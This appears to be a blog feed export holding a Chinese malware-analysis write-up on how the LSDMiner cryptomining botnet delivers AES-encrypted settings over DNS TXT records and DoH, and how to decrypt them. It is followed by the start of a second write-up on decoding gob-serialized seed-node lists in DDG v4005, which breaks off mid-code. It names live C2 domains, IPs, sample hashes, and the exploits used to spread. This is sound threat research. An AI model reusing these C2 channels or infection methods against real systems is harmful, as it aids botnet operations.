<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>10 月中旬，部门老司机发给我一个 LSDMine(旧称 <strong>Watchdogsminer</strong>) 最新活动中的一个样本(MD5:  114d76b774185b826830cb6b015cb56f)。当时大概看了一眼，里面用到了 DNS TXT 记录和 DoH(DNS over HTTPS) 来传输经过 AES 加密的数据，手头忙别的事，就先搁下了。近来捡起来分析，Google 搜索样本中用到的一个函数 <strong>NewAesCipher128()</strong> ，发现国外安全公司 <strong>Anomali</strong> 已经分析过这个 Case ：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/google_search.png" style="zoom:50%;"></p>
<p>Anomali 的 Blog： <a href="https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect" target="_blank" rel="external">Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect</a></p>
<p>跟 <a href="https://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/">以前的版本</a> 一样，LSDMiner 的样本仍然是用 Go 编写，但是内部代码结构以及具体功能已经跟旧版本有很大差异。明显的差异至少有以下 3 点：</p>
<ul>
<li>放弃了使用 Pastebin 作为恶意 Shell 脚本的下发通道，转而使用自己维护的 CC 服务器( <code>*.systemten.org</code> )来承载相关恶意活动；</li>
<li>集成了多个漏洞 Exp，增强传播能力，详见 Anomali 的 Blog；</li>
<li>利用 DNS TXT 记录下发多种经过 AES 加密的数据，这些加密数据有以下几种：<ul>
<li>最新的恶意 Cron 任务用到的恶意 Shell 脚本下载 URL，可以写入失陷主机的 Cron 任务；</li>
<li>最新的恶意样本版本号，失陷主机上已有的恶意样本会对比自己的版本号以决定是否 Update；</li>
<li>最新的恶意 Shell 脚本；</li>
<li>一系列最新二进制样本的下载 URL。</li>
</ul>
</li>
</ul>
<p>其他恶意行为按照常规的逆向分析方法按部就班分析即可，而关于加密的 DNS TXT 数据的逆向与解密过程，Anomali 的 Blog 中描述一带而过，并没详述，按照他们 Blog 中简单的描述，并不足以解密这些数据。本文就以上述样本为例，解析一下如何通过逆向样本一步一步解密这些数据。</p>
<a id="more"></a>
<h2 id="2-恶意样本执行流程"><a href="#2-恶意样本执行流程" class="headerlink" title="2. 恶意样本执行流程"></a>2. 恶意样本执行流程</h2><p>恶意样本总体的执行流程分为 3 步：</p>
<ol>
<li>通过 DNS TXT 通道获取用来篡改失陷主机 Cron 任务的恶意 URL，被篡改后的 Cron 任务会定期访问恶意 URL 获取最新的恶意 Shell 脚本；</li>
<li>扫描当前 B 段网络，存活的  IP 尝试利用 4 种方式入侵并植入，4 种方式有：<ul>
<li>SSH 爆破；</li>
<li>Redis 未授权访问；</li>
<li>Jenkins RCE 漏洞(CVE-2019-1003000)利用；</li>
<li>ActiveMQ RCE 漏洞(CVE-2016-3088)利用</li>
</ul>
</li>
<li>持久驻留失陷主机、释放矿机程序挖矿。</li>
</ol>
<p>在最后第 3 步，也会通过 DNS TXT 通道获取最新恶意 Shell 脚本以及二进制样本的下载 URL。本文重点分析 DNS TXT 通道数据的获取以及解密。</p>
<p>先看一下恶意样本通过 DNS TXT 通道获取最新的用来篡改失陷主机 Cron 任务的恶意 URL 的整体流程：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/lookup_and_dec_dnstxt.png" alt=""></p>
<p>可以看到样本首先从<code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code> 获取数据，然后用 AES-128bit 算法将其解密。再看一下从 <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code> 获取的加密数据：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/dns_txt_rec.png" alt=""></p>
<p>DNS TXT 响应是一串字符，而且是经过 Base64 编码的字符串 <em>A7PZtADnYAEMEArGhmA9xQihPq9TRz4QigssjeOmUnQ</em> 。函数 <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong> 中的处理流程可以证实这一点：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/func_aescipher128_decrypt.png" style="zoom:60%;"></p>
<p>到这里可以看出，要用 Go 语言编程解密这些数据，需要 3 步走：</p>
<ol>
<li>Base64 解码 DNS TXT 的响应字串，得到待解密的二进制数据；</li>
<li>初始化 Go AES-128bit 解密句柄；</li>
<li>解密 Base64 解码过的二进制数据。</li>
</ol>
<h2 id="3-Base64-解码"><a href="#3-Base64-解码" class="headerlink" title="3. Base64 解码"></a>3. Base64 解码</h2><p>先用 Linux 自带的命令行工具 <strong>base64</strong> 尝试解码：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_fail.png" alt=""></p>
<p>有点蹊跷，不能用 base64 命令直接解码，看来用的并不是标准的 Base64 编码。这里先补充一下关于 Base64 编码的两点背景知识：</p>
<ol>
<li>参考: <a href="https://tools.ietf.org/html/rfc4648" target="_blank" rel="external">RFC4648</a> ，Base64 编码主要有两种：<strong>标准编码(StdEncoding)</strong> 和 <strong>URL 安全的编码(URLEncoding)</strong>。标准 Base64 编码的编码字符表是 <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</em> ，而 URLEncoding 的编码字符表则把 StdEncoding 编码字符表中的 <strong>+</strong> 替换为 <strong>-</strong>，把 <strong>/</strong> 替换为 <strong>_</strong> ，即 <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_</em> ；</li>
<li>Base64 两种编码的默认填充字符都是 <strong>=</strong> ，但也可以选择不填充任何字符。</li>
</ol>
<p>上述两个知识点，在 <a href="https://golang.org/pkg/encoding/base64/?m=all" target="_blank" rel="external">Go 的 Base64 标准库文档</a> 开头就有说明：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/base64_godoc.png" alt=""></p>
<p>两个知识点各自分为两种情况，这样组合起来就有 4 种细分的 Base64 Encoding：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/different_type_encodings.png" alt=""></p>
<p>那 LSDMiner 样本中具体是用什么样的 Base64 解码呢？需要先看一下样本中 Base64 解码的 Encoding 句柄是如何生成的。在函数 <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong> 中，是先拿到 Base64 解码的 Encoding 句柄再进行解码：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_b64encodingobj.png" alt=""></p>
<p>通过上面的 xrefs 信息，可知这个 <strong>b64EncodingObj</strong> 是在函数 <strong>encoding_base64_init()</strong> 中生成的。进入这个 init 函数，<strong>b64EncodingObj</strong> 生成过程如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64encoding_init.png" alt=""></p>
<p>可以看到这样两点：</p>
<ol>
<li>调用 base64.NewEncoding() 函数时，传入的参数是 URLEncoding 的编码字符表，即样本中用的是 URLEncoding 形式的 Base64 编码；</li>
<li>调用 base64.URLEncoding.WithPadding() 函数时传入的参数是 <strong>-1</strong> ，即 <strong>base64.NoPadding</strong> ，不带填充字符，即 <strong>base64.RawURLEncoding</strong>。</li>
</ol>
<p>至此就可以解码 DNS TXT 响应的字符串了。测试代码与结果如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_test.png" alt=""></p>
<h2 id="4-AES-解密二进制数据"><a href="#4-AES-解密二进制数据" class="headerlink" title="4. AES 解密二进制数据"></a>4. AES 解密二进制数据</h2><p>通过前面粗略的逆向分析，我们仅知道样本中用了 AES-128bit 算法来解密数据，但这些知识远不足以解密上面用 Base64 解码得到的二进制数据。AES 加密算法此处不详述，可以自行搜索相关资料，本文只关注如何用算法来解密数据。要想正确解密数据，还需要确定以下 AES 解密算法相关的几个要素：</p>
<ul>
<li>AES 密钥；</li>
<li>AES 解密用到的 IV 向量；</li>
<li>AES 解密算法的分组密码模式；</li>
<li>AES 解密算法的 Padding 方式。</li>
</ul>
<p>上面的逆向分析过程中，我们注意到样本中调用了函数 <strong>crypto_cipher_NewCBCDecrypter()</strong> ，可以确认样本中用到的分组密码模式是 <strong>CBC</strong>。</p>
<p>在分析确认其他几个要素之前，我们先捋一下两个关键函数的逻辑：初始化 AES 解密句柄的 <strong>NewAesCipher128()</strong> 和 执行 AES 解密操作的 <strong>AesCipher128_Decrypt()</strong>。</p>
<h3 id="4-1-NewAesCipher128"><a href="#4-1-NewAesCipher128" class="headerlink" title="4.1 NewAesCipher128"></a>4.1 NewAesCipher128</h3><p>首先，样本调用该函数的时候传入一个参数，即待查询 DNS TXT 记录的域名字符串 <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code>：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_newaescipher128.png" style="zoom:50%;"></p>
<p>在函数内部先初始化一个 <strong>crypto/md5</strong> 句柄（代码片段对照左边标准库函数 <strong>crypto_md5_New()</strong> 即可理解)：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_init.png" alt=""></p>
<p>然后将传入的域名字符串由 string 类型转成字符切片并写入 MD5 digest 对象，再通过 <strong>md5.digest.Sum()</strong> 函数做一次 MD5 Hash 计算(注意 Sum 函数传入的参数为 <strong>nil</strong> )：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/first_round_md5_hash.png" style="zoom:55%;"></p>
<p>再把这轮 MD5 计算的值通过 <strong>hex.EncodeToString()</strong> 转成 32-bytes 的字符串，即常规的字符串形式的 MD5 值。然后取出再取出这个 MD5 值的<strong>前 16 字节</strong>，保存到变量(<strong>r1HashStr_16bytes</strong>)中备用：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/slice_r1hashstr.png" style="zoom:60%;"></p>
<p>接下来，样本又做了一次 MD5 计算，并且取出这一次 MD5 值的<strong>后 16 字节</strong>，保存到变量中备用(注意，这一次 MD5 计算之前没有调用 md5.dgest.Write() 来写入新字节，并且调用 md5.digest.Sum() 函数时依然传入参数 <strong>nil</strong> ):</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/r2_md5_hash.png" style="zoom:60%;"></p>
<p>后面可以看到，第一次 MD5 计算后取出的 <strong>前 16 字节</strong> 数据，被作为 <strong>AES 密钥</strong>传入 <strong>aes.NewCipher()</strong> 函数来初始化 AES 解密句柄：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/init_aes_cipher.png" style="zoom:80%;"></p>
<p>而第二次 MD5 计算后取出的 <strong>后 16 字节</strong> 数据被保存起来，作为本函数返回值的一部分返回，接下来作为 <strong>AES 的 IV 向量</strong>传给后面函数 <strong>AesCipher128_Decrypt()</strong> 中调用的 <strong>crypto_cipher_NewCBCDecrypter()</strong> 函数。</p>
<h3 id="4-2-AES-的-Padding-方式"><a href="#4-2-AES-的-Padding-方式" class="headerlink" title="4.2 AES 的 Padding 方式"></a>4.2 AES 的 Padding 方式</h3><p>前面内容分析确认了 AES 的 Key、IV 以及分组密码模式，还需最后确认 AES 算法所用的 Padding 方式，即可正确解密数据。这一个点需要逆向分析函数 <strong>AesCipher128_Decrypt()</strong> 才能确认。</p>
<p>AES 加密算法用到的常见的 Padding 方式有以下几种(参考： <a href="https://www.jianshu.com/p/b63095c59361" target="_blank" rel="external">对称加密算法和分组密码的模式</a>)：</p>
<ul>
<li><p>ANSI X.923：也叫 <strong>ZeroPadding</strong>，填充序列的最后一个字节填<code>paddingSize</code>，其它填0。</p>
</li>
<li><p>ISO 10126：填充序列的最后一个字节填<code>paddingSize</code>， 其它填随机数。</p>
</li>
<li><p>PKCS7：填充序列的每个字节都填<code>paddingSize</code> 。</p>
</li>
</ul>
<p>LSDMiner 中用到的 Padding 方式就是简单的 ZeroPadding，通过函数 <strong>AesCipher128_Decrypt()</strong> 中解密操作后的 <strong>byte.Trim()</strong> 函数即可确认：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/unpadding.png" style="zoom:50%;"></p>
<h3 id="4-3-补充说明——关于二轮-MD5-值计算"><a href="#4-3-补充说明——关于二轮-MD5-值计算" class="headerlink" title="4.3 补充说明——关于二轮 MD5 值计算"></a>4.3 补充说明——关于二轮 MD5 值计算</h3><p>上述分析过程中描述过，恶意样本为生成 AES 解密用到的 Key 和 IV 向量，对相应域名字符串连续做了 2 轮 MD5 Hash 计算，这一点 Anomali 的 Blog 中也提到了，只是他们没提到 Key 和 IV 具体的生成过程。</p>
<p>然而样本中连续两轮的 MD5 计算的值其实是相同的——这是 Go 语言特有的 MD5 计算方式，参考 <a href="https://codeday.me/bug/20190214/636073.html" target="_blank" rel="external">hash – Golang md5 Sum()函数</a> ，演示代码如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_test.png" style="zoom:60%;"></p>
<p>这一点不知道是恶意软件作者的失误，还是有意为之。倒是容易给逆向分析造成困扰，因为乍一看“两轮 MD5 计算”，很可能直观认为应该得出两个不同的 MD5 值，并分别截取一段做 AES 解密的 Key 和 IV 向量，没想到两次 MD5 计算得出相同的值。</p>
<h2 id="5-完成解密"><a href="#5-完成解密" class="headerlink" title="5. 完成解密"></a>5. 完成解密</h2><p>基于以上分析，就可以编写程序完成我们想要的解密工作了。完整的 Go 语言代码已上传到 Github：</p>
<p> <a href="https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt" target="_blank" rel="external">https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt</a> </p>
<p>运行结果如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/aes_decrypt.png" alt=""></p>
<p>当前解密出来的 Cron URL 是 <strong><code>lsd.systemten.org</code></strong> ，在样本中如果整个 DNS TXT 数据通道操作过程有任何异常而无法解密出最新的 Cron URL，备用的默认值也是这个 <strong><code>lsd.systemten.org</code></strong> :</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/return_decryption_result.png" style="zoom:80%;"></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>文章开头的截图中已经显示过，如果样本用 <strong>net.LookupTXT()</strong> 函数检索 DNS TXT 记录失败，还会跳转到另外一个代码分支，去用 DoH(DNS over HTTPS) 向 CloudFlare 的 DoH 服务器请求相应的 DNS TXT 记录：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_req_1.png" alt=""></p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_via_cloudflare.png" alt=""></p>
<p>我们用命令行工具测试一下，可以看到这种方式也有效：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_test.png" alt=""></p>
<p>利用 DNS TXT 记录和 DoH 下发恶意数据来辅助恶意样本的运行，可以进一步提升整个 Botnet 基础设施的健壮性和运营的灵活性，鉴于这个 Botnet 存活已久并不断更新，应该引起业界的持续关注。</p>
<p>前文说过，恶意样本中利用 DNS TXT 通道传输的数据还有其他几种，方式都是一样：检索 DNS TXT 数据，用 base64.RawURLEncoding 解码得到二进制数据；然后对域名进行 MD5 计算得出 AES 解密用到的 Key 和 IV，然后用 CBC 模式、ZeroPadding 的 AES-128bit 算法对 Base64 解码后的二进制数据进行解密。对应的域名还有以下几个，均可以用以上 Go 程序来解密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&quot;update.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;shell.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div></pre></td></tr></table></figure>
<p>另外，LSDMiner 涉及的二进制恶意样本，都用变形 UPX 加了壳，而且壳的特征很不明显，难以用固定的特征直接检测加壳的样本。并且，相关加壳二进制样本的 UPX 壳幻数(Magic Number)还经常变化，比如本文分析的 MD5 为 <strong>114d76b774185b826830cb6b015cb56f</strong> 的 UPX 壳幻数为 <strong>0x2124922A</strong>；最新的 x86_64 架构的样本(MD5: <strong>78e3582c42824f17aba17feefb87ea5f</strong>) 的 UPX 壳幻数则变成了<strong>0x215E77F2</strong> 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;本文首发于安全客，原文链接：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/193116&quot;&gt;https://www.anquanke.com/post/id/193116&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;10 月中旬，部门老司机发给我一个 LSDMine(旧称 &lt;strong&gt;Watchdogsminer&lt;/strong&gt;) 最新活动中的一个样本(MD5:  114d76b774185b826830cb6b015cb56f)。当时大概看了一眼，里面用到了 DNS TXT 记录和 DoH(DNS over HTTPS) 来传输经过 AES 加密的数据，手头忙别的事，就先搁下了。近来捡起来分析，Google 搜索样本中用到的一个函数 &lt;strong&gt;NewAesCipher128()&lt;/strong&gt; ，发现国外安全公司 &lt;strong&gt;Anomali&lt;/strong&gt; 已经分析过这个 Case ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/lsdminer_dnstxt_decrept/google_search.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Anomali 的 Blog： &lt;a href=&quot;https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect&quot;&gt;Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;跟 &lt;a href=&quot;https://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/&quot;&gt;以前的版本&lt;/a&gt; 一样，LSDMiner 的样本仍然是用 Go 编写，但是内部代码结构以及具体功能已经跟旧版本有很大差异。明显的差异至少有以下 3 点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;放弃了使用 Pastebin 作为恶意 Shell 脚本的下发通道，转而使用自己维护的 CC 服务器( &lt;code&gt;*.systemten.org&lt;/code&gt; )来承载相关恶意活动；&lt;/li&gt;
&lt;li&gt;集成了多个漏洞 Exp，增强传播能力，详见 Anomali 的 Blog；&lt;/li&gt;
&lt;li&gt;利用 DNS TXT 记录下发多种经过 AES 加密的数据，这些加密数据有以下几种：&lt;ul&gt;
&lt;li&gt;最新的恶意 Cron 任务用到的恶意 Shell 脚本下载 URL，可以写入失陷主机的 Cron 任务；&lt;/li&gt;
&lt;li&gt;最新的恶意样本版本号，失陷主机上已有的恶意样本会对比自己的版本号以决定是否 Update；&lt;/li&gt;
&lt;li&gt;最新的恶意 Shell 脚本；&lt;/li&gt;
&lt;li&gt;一系列最新二进制样本的下载 URL。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他恶意行为按照常规的逆向分析方法按部就班分析即可，而关于加密的 DNS TXT 数据的逆向与解密过程，Anomali 的 Blog 中描述一带而过，并没详述，按照他们 Blog 中简单的描述，并不足以解密这些数据。本文就以上述样本为例，解析一下如何通过逆向样本一步一步解密这些数据。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="lsdminer" scheme="http://jiayu0x.com/tags/lsdminer/"/>
    
      <category term="aes" scheme="http://jiayu0x.com/tags/aes/"/>
    
      <category term="decrypt" scheme="http://jiayu0x.com/tags/decrypt/"/>
    
  </entry>
  
  <entry>
    <title>以 DDG v4005 样本为例浅谈 Golang gob 序列化数据的逆向解码</title>
    <link href="http://jiayu0x.com/2019/11/19/decode-gob-data-in-ddg-v4005/"/>
    <id>http://jiayu0x.com/2019/11/19/decode-gob-data-in-ddg-v4005/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-21T12:55:08.136Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p><strong>本文首发于安全客，原文链接：</strong><br><a href="https://www.anquanke.com/post/id/192948" target="_blank" rel="external">https://www.anquanke.com/post/id/192948</a></p>
</blockquote>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>DDG 是一个 一直活跃的挖矿僵尸网络，其主样本由 Go 语言编写。它最新活跃的版本中用基于 Gossip 协议实现集群管理的第三方库 <strong><a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">Memberlist</a></strong> 把整个僵尸网络构建成了一个非典型的 P2P 结构。关于其 P2P 网络结构以及如何基于 P2P 特性追踪该僵尸网络，我在以前的两篇文章中有详细描述：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/177665" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(上)</a></li>
<li><a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(下)</a></li>
</ol>
<p>11.6 日晚上，我的 DDG 挖矿僵尸网络追踪程序检测到 DDG 家族更新到了版本 4005，IoC 如下：</p>
<blockquote>
<p><strong>MD5:</strong></p>
<ul>
<li>64c6692496110c0bdce7be1bc7cffd47  ddgs.i686</li>
<li>638061d2a06ebdfc82a189cf027d8136  ddgs.x86_64 </li>
</ul>
<p><strong>CC</strong>:</p>
<ul>
<li>67.207.95[.]103:8000</li>
<li>103.219.112[.]66:8000 </li>
</ul>
</blockquote>
<p>经过简单的分析，新版恶意样本的关键行为与旧版本差异不大，以前部署的追踪程序依然能持续追踪。不过其中一个小的技术点引起了我的注意。</p>
<p>以前说过，DDG 样本为了通过 Memberlist 库加入 P2P 网络(函数 <code>Memberlist.join()</code>)，需要一批初始的 P2P Nodes ，新的样本代表的 P2P 节点会通过这些初始的 P2P Nodes 加入 P2P 网络。在旧版样本中，这些初始的 P2P Nodes 被称为 <strong>Hub List</strong>，其中约有 200 个 节点 IP 地址，这一份 IP 列表以 Hex 数组形式硬编码保存在样本中。而新版 DDG 样本中则把这些 P2P Nodes 称为 <strong>Seeds</strong>(Memberlist 库 <code>Join()</code> 函数的 ”种子“)，这些 Seeds 用 <a href="https://blog.golang.org/gobs-of-data" target="_blank" rel="external">Golang gob</a> 序列化编码后再硬编码保存在样本中，样本里还用一组 <code>ddgs_network__mlUtils_*</code> 函数来处理这些 Seeds：</p>
<a id="more"></a>
<p><img src="/imgs/decrypt_gob/mlutils_funcs.png" style="zoom:60%;"></p>
<p>对于旧版样本的做法，定位到 Hub List 数据后，在 IDAPro 中逆向分析样本时直接用 IDAPython 脚本将 Hex 形式的 IP 地址转成点分十进制表示即可一目了然把这些 IP 提取出来，但新版样本中这些数据被 gob 序列化编码过，该怎么提取？</p>
<h2 id="2-gob-序列化编码"><a href="#2-gob-序列化编码" class="headerlink" title="2. gob 序列化编码"></a>2. gob 序列化编码</h2><p>gob(<strong>Go Binary</strong> 的简称)，是 Go 语言自带的序列化编码方案，用法简洁，灵活性和效率很高，也有一定的扩展性。可以类比 Python 的 Pickle，用来对结构化数据进行序列化编解码以方便数据传输。由于 gob 是 Go 独有的，并没有现成的 Python 接口，所以想用 Python 在 IDAPro 中直接解码不太现实，就只好手动把编码过的二进制数据从样本中 Dump 出来，然后写 Go 程序来解码。</p>
<p>使用 gob 对数据编码，一般是发送端针对已定义好结构的数据进行编码后发送；接收端收到二进制数据后，按照与发送端<strong>兼容</strong>的数据结构进行解码(不一定是完全相同的结构定义，但数据类型以及数量要兼容发送端的数据结构定义，这个 <strong>兼容</strong> 则体现了 gob 的灵活性)。一个简单的数据结构如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123;</div><div class="line">	X, Y, Z <span class="keyword">int</span></div><div class="line">	Name    <span class="keyword">string</span></div><div class="line">    L       []<span class="keyword">string</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，要逆向分析经 gob 序列化编码过的数据，对数据进行精准解码，最大的难点在于逆向出 Go 语言形式的数据结构定义。</p>
<p>gob 的用法不是本文重点，可以参考<a href="https://blog.golang.org/gobs-of-data" target="_blank" rel="external">官方介绍</a> 与这一篇<a href="https://www.bitlogs.tech/2019/08/go-encoding/gob/" target="_blank" rel="external">中文详解</a> 。</p>
<h2 id="3-恶意样本中的数据解码过程"><a href="#3-恶意样本中的数据解码过程" class="headerlink" title="3. 恶意样本中的数据解码过程"></a>3. 恶意样本中的数据解码过程</h2><p>以样本 ddgs.x86_64(MD5: <strong>638061d2a06ebdfc82a189cf027d8136</strong>) 为例，在函数 <code>ddgs_network__mlUtils_JoinAll()</code> 中，通过对 <code>Memberlist.Join()</code> 函数的调用，即可顺藤摸瓜找到数据解码以及转换的函数：</p>
<p><img src="/imgs/decrypt_gob/process_of_data_dec.png" alt=""></p>
<p>最上面的 <code>ddgs_network__mlUtils_Seeds()</code> 函数中，可以看到样本中经 gob 序列化编码的数据地址与长度，样本先是读取这一段数据，然后用 gob 进行解码：</p>
<p><img src="/imgs/decrypt_gob/decode_raw_data.png" alt=""></p>
<p>在 IDAPro 中逆向分析样本，无法还原数据的结构定义。我们把这段数据手动 Dump 出来看看：</p>
<p><img src="/imgs/decrypt_gob/hexdump_of_raw_data.png" alt=""></p>
<p>可以看到高亮的两个字段名：<strong>IP</strong> 和 <strong>Port</strong>。到这里就有点灵感了，我们再看看解密后的数据是如何使用的，就能看出这些数据到底是什么结构了。在函数 <code>ddgs_network__mlUtils_Seeds()</code> 中继续往下看，会发现样本为了把这些 Seed Nodes 列表输出到日志中，用 <code>ddgs_network__mlUtils_Seeds_func1()</code> 函数把解密后的数据做了解析、重组：</p>
<p><img src="/imgs/decrypt_gob/logprint_plain_data.png" style="zoom:60%;"></p>
<p>在函数<code>ddgs_network__mlUtils_Seeds_func1()</code> 中，样本内部把解密后的数据以循环处理的方式，依次调用 <code>ddgs_network__seedNode_Address()</code> 函数来解析成字符串，并把每个代表 Seed Node 的字符串用竖线 <strong>|</strong> 连接起来：</p>
<p><img src="/imgs/decrypt_gob/convert_seed_node.png" style="zoom:50%;"></p>
<p>看来逆向出数据结构定义的关键就是 <code>ddgs_network__seedNode_Address()</code> 函数函数了：</p>
<p><img src="/imgs/decrypt_gob/convert_seed_node_do.png" style="zoom:50%;"></p>
<p>可以看到 <code>ddgs_network__seedNode_Address()</code> 函数中，对每一个 Seed Node 对象都做两部分处理：第一个成员是用 Go 标准库 <code>net.IP.String()</code> 函数将 <code>net.IP</code> 对象转化为 String 类型；第二个成员是直接转化为 64bit 整型值。最后将 String 类型的 IP 地址与整型的 Port 值串成一个 <code>IP:Port</code> 结构的字符串来代表一个 Seed Node。</p>
<p>这正好跟前文用 Hexdump 查看 Raw 二进制数据里的两个字段 <strong>IP</strong> 和 <strong>Port</strong> 对上了。</p>
<p>至此，我们就可以断定，这些 gob 编码数据的<strong>基础结构定义</strong>应该如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"net"</span></div><div class="line"></div><div class="line"><span class="keyword">type</span> SeedNode <span class="keyword">struct</span> &#123;</div><div class="line">	IP   net.IP</div><div class="line">	Port <span class="keyword">int64</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="4-完成数据解码"><a href="#4-完成数据解码" class="headerlink" title="4. 完成数据解码"></a>4. 完成数据解码</h2><p>上面我们分析出了编码数据原始的<strong>基础结构定义</strong>，之所以说是<strong>基础</strong>，是因为这个结构定义只代表<strong>单个 Seed Node</strong>，而这些数据是<strong>一批 Seed Node</strong> 的列表。要想写程序完成最终的数据解码，还需要用 Go 的数组或切片把上面的数据结构定义封装一下。最终的数据解码代码关键部分示例如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> SeedNode <span class="keyword">struct</span> &#123;</div><div class="line">	IP   net.IP</div><div class="line">	Port <span class="keyword">int64</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Open the dumped raw data file</span></div><div class="line">fd, fdErr := os.OpenFile(<span class="string">"raw_data.dump"</span>, os.O_RDONLY, <span class="number">0644</span>)</div><div class="line">br := bufio.NewReader(fd)</div><div class="line"></div><div class="line">dec := gob.NewDecoder(br)</div><div class="line"></div><div class="line"><span class="comment">// make Seed Node slice</span></div><div class="line"><span class="keyword">var</span> d []SeedNode</div><div class="line">decErr := dec.Decode(&amp;d)</div><div class="line"></div><div 